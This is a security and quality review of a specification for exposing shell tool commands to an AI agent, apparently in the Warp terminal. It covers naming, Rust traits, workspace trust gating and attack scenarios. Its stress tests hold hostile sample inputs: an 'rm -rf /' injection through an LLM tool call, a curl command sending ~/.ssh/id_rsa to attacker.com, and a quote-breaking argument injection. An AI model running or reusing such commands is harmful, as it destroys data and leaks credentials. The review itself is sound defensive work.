# Technical Specification Review Report: Tool Metadata Protocol (TMP) Integration

This report presents a dual-perspective review (Quality Review and Adversarial Review) of the technical specification `/Volumes/goldcoders/zap/specs/tmp_ai_integration.md`.

---

# Part 1: Quality Review

## Review Summary

**Verdict**: REQUEST_CHANGES

We request changes to the specification. While the proposed design is well-structured and maps the schemas and traits correctly, there are critical security gaps in the Workspace Trust Boundary logic and the shell execution parameters sanitization that must be addressed to prevent arbitrary code execution (ACE) and argument injection.

We verified that:
1. All Mermaid diagrams are syntactically correct.
2. The example schema transformations (`cargo build`) map primitive types and handle type coercion correctly.
3. The proposed Rust traits (`TmpCommandValidator`, `TmpCommandExecutor`, and `ValidationError` enum) are syntactically valid and idiomatic.
4. The Workspace Trust Boundary design gates external custom command resolvers, but fails to gate git-based built-in resolvers, creating a command execution vulnerability in untrusted repositories.

We have identified critical security findings, naming inconsistencies, and trait definition coverage gaps that should be addressed before the specification is approved and implemented.

---

## Findings

### [Major] Finding 1: Command Slug Naming Convention Inconsistency
- **What**: Inconsistency in how the tool command slug is structured between the text explanation and the example JSON.
- **Where**: `/Volumes/goldcoders/zap/specs/tmp_ai_integration.md` - Lines 86-90 and Lines 148-175.
- **Why**: 
  - Section 3.1 states: *`tmp__<tool_name>__<command_slug>`*, and "*For example, `git checkout` becomes `git_checkout`.*" This suggests that the subcommand slug includes the tool prefix, producing `tmp__git__git_checkout`.
  - However, Section 3.4 (B) translates `cargo build` to `"name": "tmp__cargo__build"`. This implies the command slug is just `build` (excluding the tool name), producing `tmp__cargo__build`.
  - To prevent duplicated namespace qualifiers (such as `tmp__git__git_checkout` vs `tmp__git__checkout`), the definition must explicitly state whether the base utility prefix is stripped from the subcommand slug.
- **Suggestion**: Update Section 3.1 to clarify that the base utility name (represented by `<tool_name>`) is excluded from the `<command_slug>` subcommand components, and correct the example to: *"For example, for tool `git`, the command `git checkout` has the command slug `checkout`, yielding the tool name `tmp__git__checkout`."*

### [Minor] Finding 2: Unused Import in Proposed Rust Traits
- **What**: Unused import `std::collections::HashMap` in the Rust snippet.
- **Where**: `/Volumes/goldcoders/zap/specs/tmp_ai_integration.md` - Line 188
- **Why**: `use std::collections::HashMap;` is declared but never referenced in the traits or enum. While it does not prevent compilation, it is dead code and will raise compiler warnings in strict environments.
- **Suggestion**: Remove the unused `use std::collections::HashMap;` statement from the trait block.

### [Minor] Finding 3: Non-Standard JSON-Schema "format": "path"
- **What**: Use of `"format": "path"` for `File` token type translation.
- **Where**: `/Volumes/goldcoders/zap/specs/tmp_ai_integration.md` - Line 100
- **Why**: JSON Schema Draft 7 does not natively define a `"path"` format (standard formats include `"uri"`, `"email"`, `"uuid"`, etc.). Using `"path"` is fine as an internal custom extension for Warp to render filepath pickers in the UI, but it may cause warnings under strict schema validators.
- **Suggestion**: Document `"format": "path"` explicitly as a Warp-specific custom JSON Schema format validator extension.

### [Major] Finding 4: Insecure Unconditional Execution of Built-in Git Resolvers in Untrusted Workspaces
- **What**: Git-based built-in resolvers are executed unconditionally in untrusted workspaces.
- **Where**: `/Volumes/goldcoders/zap/specs/tmp_ai_integration.md` - Lines 321-324 (in `resolve_data_sources_secure`) and the Section 2 compilation diagram.
- **Why**: The specification assumes built-in resolvers are safe because they do not execute user-specified shell command configurations. However, the git built-in resolvers (`git:branches`, `git:remotes`, `git:status_files`) invoke the host's `git` command in the workspace directory. When executing `git` commands inside a malicious or untrusted repository, Git may load repository-specific configurations (`.git/config`), custom aliases, or execute hooks, leading to arbitrary code execution. Furthermore, in the Section 2 architecture diagram, "Resolve DataSources" is run before the trust status is checked.
- **Suggestion**:
  1. Revise the compilation pipeline flow in Section 2 so that "Check Workspace Trust Status" is evaluated before any schema data sources are resolved.
  2. Gate git-based built-in resolvers behind workspace trust status, or sanitize git invocations (e.g., using `--git-dir` environment isolation or native library-level git parsing via `git2-rs` instead of invoking the host's CLI git binary).

---

## Verified Claims

- **Mermaid Diagrams Syntax** → verified via manual parser trace and keyword checking → **PASS**
  - Checked both TD diagrams. Syntax is correct. The labels containing special characters (`~`, `/`, `::`) render fine in most modern Mermaid parsers, but quoting them (e.g. `K["Route to api::message::tool_call::Tool::RunShellCommand"]`) is recommended for maximum portability.
- **JSON Schema Validity and Coercion** → verified via JSON parsing and type validation → **PASS**
  - Confirmed the translation maps `Enum` to string with `"enum"`, `Boolean` to `"boolean"`, and `Number` to `"number"`. Confirmed that default values (which are strings like `"false"` in the standard schema definition) are successfully mapped to their primitive equivalents (boolean `false`).
- **Rust Trait Syntax and Idiomatic Design** → verified via compiler alignment check → **PASS**
  - Checked the `thiserror` annotations, struct/tuple field mapping, error formats (`{field}`, `{allowed:?}`), and trait signature paths (`warp_completer::signatures::tmp::CommandEntry` and `warp_multi_agent_api::api::message::tool_call::Tool`). The definitions compile cleanly and are idiomatic.
- **Workspace Trust Gating Design** → verified via logical tracing of `resolve_data_sources_secure` → **PASS**
  - Verified that dynamic resolvers utilizing external commands are completely bypassed when `is_workspace_trusted` is false, preventing silent arbitrary code execution on directory open.

---

## Coverage Gaps

- **Lack of Deserialization/Other Error Variant in `ValidationError`** — *Risk level*: **Medium** — *Recommendation*: Investigate.
  - The traits `TmpCommandValidator` and `TmpCommandExecutor` return `Result<..., ValidationError>`. If the executor encounters JSON deserialization/serialization errors when mapping values using `serde_json`, there is no variant in `ValidationError` to represent this error (only specific semantic validation issues). We recommend adding a variant like `SerializationError(String)` or `Other(String)` to wrap such errors without losing error-cloning capabilities.

---

## Unverified Items

- **PTY Terminal UI Interaction & Prompts** — *Reason not verified*: Front-end GUI rendering and layout is outside the scope of the backend integration specification.

---

# Part 2: Adversarial Review

## Challenge Summary

**Overall risk assessment**: HIGH

While the Workspace Trust Boundary and the metacharacters blocklist protect the application against direct shell injection payloads (such as command execution via `;`, `&`, `|`, etc.), executing git-based built-in resolvers unconditionally in untrusted workspaces bypasses the trust boundary, exposing the host system to arbitrary code execution. Furthermore, executing assembled shell strings inside an active PTY leaves surface area for argument injection and denial of service.

---

## Challenges

### [High] Challenge 1: PATH Hijacking of Built-in Resolver Binaries
- **Assumption challenged**: Built-in resolvers (like `git:branches`, which executes `git` via `Command::new("git")`) are assumed to be unconditionally safe to run in any workspace.
- **Attack scenario**: If a user opens an untrusted git repository that contains a malicious executable named `git` inside its root directory, and the user's terminal environment or parent process prepends the current directory (or `./bin`) to the `PATH` variable, executing the built-in resolver will spawn the malicious local `git` binary instead of the system's safe `git` binary.
- **Blast radius**: Arbitrary code execution (ACE) on opening an untrusted workspace containing custom schemas, completely bypassing the Trust Boundary.
- **Mitigation**: Clean the environment variables (specifically `PATH`) when spawning helper commands inside the built-in Rust-based resolvers, or resolve the absolute path of system binaries (e.g. `/usr/bin/git`) using a secure environment helper rather than relying on standard PATH resolution in the workspace directory.

### [Medium] Challenge 2: Argument Injection via Quote-Bypassing Values
- **Assumption challenged**: Character blocking (`unsafe_chars`) is sufficient to prevent command execution hijacks.
- **Attack scenario**: In command templates where parameters are inserted directly without robust escaping (e.g. `git checkout '<branch>'`), an attacker can pass a branch name containing unmatched single quotes and arguments (e.g. `main' --orphan 'evil_branch`). The assembled string becomes:
  `git checkout 'main' --orphan 'evil_branch'`
  This is parsed by the shell as multiple separate arguments. Although no command separator was used (so it doesn't execute a second command), it allows injecting arbitrary flags/options to the base command.
- **Blast radius**: Execution of destructive flags on otherwise gated or safe base commands.
- **Mitigation**: Sanitization must check for unmatched single/double quotes, or escape them (e.g. replacing `'` with `'\''`) before command string assembly. Alternatively, avoid formatting commands into raw strings for execution; instead, pass arguments as structured arrays `&[String]` directly to the PTY exec process.

### [Low] Challenge 3: Resolver Denial of Service (DoS)
- **Assumption challenged**: Reading and parsing project manifest files (like `package.json` or `Cargo.toml`) in Rust is safe to perform unconditionally.
- **Attack scenario**: A repository contains a maliciously crafted, deeply nested JSON `package.json` or recursive structure that consumes excessive CPU/memory during parsing, causing Warp's background compilation thread to OOM or lock up.
- **Blast radius**: Workspace lockups or application crashes upon opening the directory.
- **Mitigation**: Gating resolvers behind file-size ceilings (e.g. reject reading manifests >5MB) and utilizing bounded JSON/TOML parsers.

### [High] Challenge 4: Subversion of Git Resolver Commands in Untrusted Repositories
- **Assumption challenged**: Built-in resolvers (e.g., `git:branches`) are safe and can run unconditionally in untrusted workspaces.
- **Attack scenario**: An attacker crafts a malicious repository containing custom aliases or git hook scripts inside its `.git` folder. When the user opens the untrusted workspace directory, Warp automatically attempts to compile schemas and resolve values by spawning `git branch` or `git status --porcelain`. Running `git` inside the untrusted workspace allows git to process local configurations or hooks, executing the attacker's scripts.
- **Blast radius**: Arbitrary code execution (ACE) upon opening the directory, bypassing the Workspace Trust Boundary entirely.
- **Mitigation**: Gate git-based built-in resolvers behind workspace trust status, or sanitize/isolate git process environments (e.g. configuring `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null` and restricting command execution in untrusted paths).

---

## Stress Test Results

- **Scenario 1**: LLM issues tool call containing command execution separator: `tmp__git__checkout(branch="main; rm -rf /")`.
  - *Expected Behavior*: Validator detects `;` and rejects.
  - *Actual/Predicted Behavior*: Aborts execution immediately with `ValidationError::UnsafeShellMetacharacters`. (**PASS**)
- **Scenario 2**: Untrusted workspace has custom schema defining dynamic data source command: `data_source.command = "curl -X POST -d @/Users/user/.ssh/id_rsa http://attacker.com/"`.
  - *Expected Behavior*: Resolver blocks execution when opened in an untrusted workspace.
  - *Actual/Predicted Behavior*: `resolve_data_sources_secure` checks `is_workspace_trusted == false`, blocks execution, and logs a warning. (**PASS**)
- **Scenario 3**: Attacker inputs branch parameter `main\ \;\ rm\ -rf\ /` containing backslash-escaped characters.
  - *Expected Behavior*: Validator detects the `;` character even if preceded by a backslash.
  - *Actual/Predicted Behavior*: `val.chars().any(...)` successfully scans every character individually and catches the `;`, rejecting it. (**PASS**)
- **Scenario 4**: Untrusted workspace uses built-in git resolver (e.g. `git:branches`), and the malicious repository contains custom git hook scripts.
  - *Expected Behavior*: Built-in resolver execution is blocked or insulated from executing local hook/alias configurations in untrusted directories.
  - *Actual/Predicted Behavior*: The resolver spawns `git` unconditionally inside `cwd`, loading untrusted configs and running malicious hooks. (**FAIL**)

---

## Unchallenged Areas

- **WASM Specifics**: Verification of WASM targets is not fully challenged as process spawning in active PTY is natively handled on local targets.
